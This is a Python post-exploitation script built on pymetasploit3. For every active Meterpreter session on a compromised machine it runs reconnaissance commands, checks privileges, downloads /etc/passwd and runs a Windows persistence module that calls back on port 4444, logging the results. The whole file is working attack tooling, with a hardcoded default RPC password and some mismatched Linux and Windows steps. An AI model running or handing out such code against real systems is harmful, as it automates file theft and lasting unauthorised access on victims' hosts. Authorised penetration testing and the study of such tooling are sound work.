import os
from pymetasploit3.msfrpc import MsfRpcClient

LOG_FILE = 'logs/post_exploitation.txt'


def log_output(session_id, command, output):
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, 'a') as f:
        f.write(f"\n[Session {session_id}] Command: {command}\n")
        f.write(output + "\n")


def connect_to_metasploit(password='password123', username='msf', port=55553):
    try:
        client = MsfRpcClient(password, username=username, port=port, ssl=False)
        print("[+] Connected to Metasploit RPC (Post Exploitation)")
        return client
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        exit(1)


def run_meterpreter_command(session, command):
    try:
        result = session.run_with_output(command)
        return result.strip()
    except Exception as e:
        return f"[!] Error executing command '{command}': {e}"


def handle_post_exploitation(session_id, session):
    print(f"[+] Interacting with session {session_id}")

    commands = ["getuid", "pwd", "ls", "sysinfo"]
    for cmd in commands:
        output = run_meterpreter_command(session, cmd)
        print(f"\n[Session {session_id}] {cmd} →\n{output}")
        log_output(session_id, cmd, output)

    # Try privilege escalation check
    priv_cmd = "getprivs"
    priv_output = run_meterpreter_command(session, priv_cmd)
    print(f"\n[Session {session_id}] {priv_cmd} →\n{priv_output}")
    log_output(session_id, priv_cmd, priv_output)

    # Try to download a known file if possible
    download_cmd = "download /etc/passwd"
    download_output = run_meterpreter_command(session, download_cmd)
    print(f"\n[Session {session_id}] {download_cmd} →\n{download_output}")
    log_output(session_id, download_cmd, download_output)

    # Attempt basic persistence (using Metasploit post module as example)
    try:
        persistence = session.client.modules.use('post', 'windows/manage/persistence')
        persistence['SESSION'] = session_id
        persistence['LHOST'] = '0.0.0.0'
        persistence['LPORT'] = 4444
        print(f"\n[*] Running persistence module on session {session_id}...")
        result = persistence.execute()
        log_output(session_id, 'windows/manage/persistence', str(result))
    except Exception as e:
        print(f"[!] Failed to run persistence module: {e}")


def main():
    client = connect_to_metasploit()
    if not client.sessions.list:
        print("[-] No active sessions found.")
        return

    for session_id, session in client.sessions.list.items():
        if session.type == 'meterpreter':
            handle_post_exploitation(session_id, client.sessions.session(session_id))
        else:
            print(f"[-] Skipping session {session_id} (not meterpreter)")


if __name__ == '__main__':
    main()

